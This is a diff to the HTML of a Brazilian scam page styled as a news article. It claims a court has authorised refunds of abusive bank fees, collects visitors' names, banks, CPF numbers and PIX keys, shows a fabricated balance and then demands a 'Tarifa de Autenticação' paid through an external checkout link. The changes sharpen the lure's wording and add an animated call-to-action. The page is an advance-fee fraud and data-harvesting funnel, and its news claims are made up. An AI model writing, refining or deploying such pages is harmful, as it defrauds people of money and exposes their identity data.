@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Portal Financeiro - Notícias</title>
+    <title>Portal Financeiro - Auditoria de Tarifas</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
         :root { --primary: #0a2540; --accent: #00d4ff; --success: #00d97e; --text: #1a1f23; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
         body { background: #f4f7f9; color: var(--text); }
 
-        /* HEADER ESTILO PORTAL */
         header { background: #fff; padding: 15px 20px; border-bottom: 2px solid #e2e8f0; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
         .logo { font-weight: 800; font-size: 16px; color: var(--primary); letter-spacing: -1px; }
         .live-dot { display: flex; align-items: center; gap: 5px; font-size: 12px; font-weight: 700; color: #ef4444; }
@@ -20,16 +19,14 @@
         .main-container { max-width: 500px; margin: 0 auto; background: #fff; min-height: 100vh; box-shadow: 0 0 20px rgba(0,0,0,0.05); }
         .content { padding: 20px; }
 
-        /* ESTILO MATÉRIA */
         .kicker { color: #b91c1c; font-weight: 800; font-size: 12px; text-transform: uppercase; margin-bottom: 8px; display: block; }
         h1 { font-size: 24px; font-weight: 800; line-height: 1.2; color: #1a1f23; margin-bottom: 15px; }
         .meta { font-size: 13px; color: #64748b; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #f1f5f9; }
         .article-p { font-size: 16px; line-height: 1.6; color: #334155; margin-bottom: 20px; }
 
-        /* CTA INICIAL */
-        .cta-start { background: var(--primary); color: #fff; padding: 20px; border-radius: 12px; text-align: center; cursor: pointer; font-weight: 700; font-size: 18px; margin: 25px 0; border: none; width: 100%; }
+        .cta-start { background: var(--primary); color: #fff; padding: 20px; border-radius: 12px; text-align: center; cursor: pointer; font-weight: 700; font-size: 18px; margin: 25px 0; border: none; width: 100%; animation: grow 2s infinite; }
+        @keyframes grow { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.02); } }
 
-        /* SISTEMA DE FUNIL (OCULTO INICIALMENTE) */
         #funnel-container { display: none; padding: 20px; background: #fff; border-radius: 16px; border: 2px solid #e2e8f0; margin-top: 20px; }
         .step { display: none; }
         .step.active { display: block; animation: slideIn 0.3s ease; }
@@ -39,53 +36,50 @@
         input { width: 100%; padding: 16px; border: 2px solid #e2e8f0; border-radius: 10px; font-size: 16px; margin-bottom: 15px; outline: none; }
         input:focus { border-color: var(--accent); }
 
-        /* BANCOS E OPÇÕES */
         .grid-opts { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
         .opt-card { border: 2px solid #e2e8f0; padding: 15px; border-radius: 10px; text-align: center; font-weight: 600; font-size: 13px; cursor: pointer; transition: 0.2s; background: #f8fafc; }
-        .opt-card.selected { border-color: var(--primary); background: #f1f5f9; color: var(--primary); transform: scale(1.03); }
+        .opt-card.selected { border-color: var(--primary); background: #f1f5f9; color: var(--primary); box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
 
-        .btn-next { background: var(--primary); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 10px; font-weight: 700; font-size: 16px; cursor: pointer; }
+        .btn-next { background: var(--primary); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 10px; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 10px; }
         
-        /* LOADING */
         .loader { text-align: center; padding: 40px 0; }
         .spinner { width: 50px; height: 50px; border: 5px solid #f1f5f9; border-top: 5px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
 
-        /* RESULTADO E TAXA */
         .balance-box { background: var(--primary); color: #fff; padding: 30px; border-radius: 12px; text-align: center; margin-bottom: 25px; }
         .amt { display: block; font-size: 40px; font-weight: 800; color: var(--success); }
         .tax-alert { background: #fff1f0; border: 1px solid #ffa39e; padding: 15px; border-radius: 8px; color: #a8071a; font-size: 14px; margin-top: 20px; }
 
-        .proof { text-align: center; font-size: 12px; color: #64748b; margin-top: 30px; }
+        .proof { text-align: center; font-size: 12px; color: #64748b; margin-top: 30px; padding-bottom: 40px; }
     </style>
 </head>
 <body>
 
 <header>
     <div class="logo">PORTAL ECONÔMICO</div>
-    <div class="live-dot"><div class="dot"></div> 1.409 CONSULTANDO AGORA</div>
+    <div class="live-dot"><div class="dot"></div> 1.409 ONLINE AGORA</div>
 </header>
 
 <div class="main-container">
     <div id="article-section" class="content">
-        <span class="kicker">UTILIDADE PÚBLICA</span>
+        <span class="kicker">ECONOMIA HOJE</span>
         <h1>Justiça autoriza devolução de taxas cobradas indevidamente em cartões e empréstimos</h1>
         <div class="meta">Por <b>Redação Central</b> • Atualizado agora</div>
         
-        <p class="article-p">Uma auditoria independente confirmou que milhões de brasileiros pagaram tarifas administrativas abusivas e juros acima do teto em contratos de empréstimos e faturas de cartão de crédito nos últimos 10 anos.</p>
+        <p class="article-p">A auditoria identificou que milhões de brasileiros pagaram taxas abusivas e juros acima do permitido em contratos de empréstimo e faturas de cartão.</p>
         
-        <p class="article-p">O valor médio de restituição identificado por CPF varia entre <b>R$ 1.500,00 a R$ 8.500,00</b>. O processo de resgate foi liberado hoje para consulta via sistema interbancário.</p>
+        <p class="article-p">A restituição pode chegar a <b>R$ 8.500,00</b> por pessoa. O sistema de consulta foi liberado para resgate via PIX.</p>
 
-        <button class="cta-start" onclick="startFunnel()">CONSULTAR MEU CPF AGORA</button>
+        <button class="cta-start" onclick="startFunnel()">CONSULTAR MEU VALOR AGORA</button>
         
-        <p class="article-p" style="font-size: 14px; color: #64748b;">*A consulta é gratuita e leva menos de 2 minutos.</p>
+        <p class="article-p" style="font-size: 14px; color: #64748b; text-align: center;">Consulta segura e imediata.</p>
     </div>
 
     <div id="funnel-container">
         
         <div id="step1" class="step active">
             <p class="question">Para começar, qual seu nome completo?</p>
-            <input type="text" id="in_nome" placeholder="Seu nome completo">
+            <input type="text" id="in_nome" placeholder="Digite seu nome">
             <button class="btn-next" onclick="nextStep(2)">CONTINUAR</button>
         </div>
 
@@ -116,11 +110,11 @@
                 <div class="opt-card" onclick="toggle(this)">Inter</div>
                 <div class="opt-card" onclick="toggle(this)">Santander</div>
             </div>
-            <button class="btn-next" onclick="nextStep(5)">REALIZAR CONSULTA</button>
+            <button class="btn-next" onclick="nextStep(5)">FINALIZAR SELEÇÃO</button>
         </div>
 
         <div id="step5" class="step">
-            <p class="question">Informe seu CPF para finalizar a varredura:</p>
+            <p class="question">Informe seu CPF para localizar os valores:</p>
             <input type="number" id="in_cpf" placeholder="000.000.000-00">
             <button class="btn-next" onclick="startLoading()">VERIFICAR SALDOS</button>
         </div>
@@ -128,37 +122,36 @@
         <div id="loading" class="step">
             <div class="loader">
                 <div class="spinner"></div>
-                <p id="load-msg" style="font-weight:700;">Localizando tarifas...</p>
+                <p id="load-msg" style="font-weight:700;">Localizando tarifas abusivas...</p>
             </div>
         </div>
 
         <div id="step6" class="step">
             <div class="balance-box">
-                <span style="font-size:12px; opacity:0.8;">SALDO DISPONÍVEL:</span>
+                <span style="font-size:12px; opacity:0.8;">SALDO LOCALIZADO:</span>
                 <span class="amt">R$ 3.842,15</span>
             </div>
-            <p class="question" style="font-size:16px;">Como deseja receber seu saldo?</p>
+            <p class="question" style="font-size:16px;">Como deseja receber seu dinheiro?</p>
             <div class="grid-opts">
                 <div class="opt-card" onclick="toggle(this, true)">PIX (Imediato)</div>
                 <div class="opt-card" onclick="toggle(this, true)">Depósito</div>
             </div>
             <input type="text" placeholder="Chave PIX (CPF, Celular ou Email)">
-            <p style="font-size:11px; margin-bottom:15px; text-align:center;">Ao clicar, você concorda com os termos de resgate.</p>
-            <button class="btn-next" style="background:var(--success)" onclick="finalProcess()">EFETUAR SAQUE AGORA</button>
+            <button class="btn-next" style="background:var(--success)" onclick="finalProcess()">SACAR VIA PIX AGORA</button>
         </div>
 
         <div id="step7" class="step">
-            <h2 style="color:var(--primary); text-align:center;">SAQUE PENDENTE</h2>
+            <h2 style="color:var(--primary); text-align:center;">SAQUE BLOQUEADO</h2>
             <div class="tax-alert">
-                <strong>⚠️ REGRA DO BANCO CENTRAL:</strong><br>
-                Para liberação imediata do saldo de R$ 3.842,15, é necessário o pagamento da <b>Tarifa de Autenticação (R$ 27,90)</b>.
+                <strong>⚠️ AÇÃO NECESSÁRIA:</strong><br>
+                Para liberar o envio do saldo de R$ 3.842,15, é necessário pagar a <b>Tarifa de Autenticação (R$ 27,90)</b> exigida pelo sistema de segurança.
             </div>
-            <p style="font-size:13px; margin:20px 0; text-align:center;">Este valor será estornado automaticamente em sua conta junto com o valor principal em até 1 minuto.</p>
-            <div style="background:#f1f5f9; padding:15px; border-radius:10px; text-align:center; margin-bottom:20px;">
-                <p style="font-size:12px; color:#64748b;">Total a receber:</p>
+            <p style="font-size:13px; margin:20px 0; text-align:center;">Este valor será reembolsado automaticamente em sua conta junto com o seu saldo em até 1 minuto.</p>
+            <div style="background:#f1f5f9; padding:15px; border-radius:10px; text-align:center; margin-bottom:20px; border: 1px solid #e2e8f0;">
+                <p style="font-size:12px; color:#64748b;">Total a ser creditado:</p>
                 <p style="font-size:26px; font-weight:800; color:var(--success);">R$ 3.870,05</p>
             </div>
-            <button class="btn-next" onclick="window.location.href='https://pay.checkoutpixes.com/checkout/cmno3t5gq02ha1yqmetvdd6v6?offer=D3VNASJ'">PAGAR TARIFA E RECEBER AGORA</button>
+            <button class="btn-next" onclick="window.location.href='https://pay.checkoutpixes.com/checkout/cmno3t5gq02ha1yqmetvdd6v6?offer=D3VNASJ'">PAGAR TARIFA E RECEBER PIX</button>
         </div>
 
     </div>
@@ -189,7 +182,7 @@
 
     function startLoading() {
         nextStep('loading');
-        const msgs = ["Auditando Taxas...", "Buscando Contratos...", "Localizando Juros...", "Gerando Relatório..."];
+        const msgs = ["Auditando Taxas...", "Buscando Contratos...", "Calculando Juros...", "Gerando Relatório..."];
         let i = 0;
         const it = setInterval(() => {
             if(i < msgs.length) { document.getElementById('load-msg').innerText = msgs[i]; i++; }
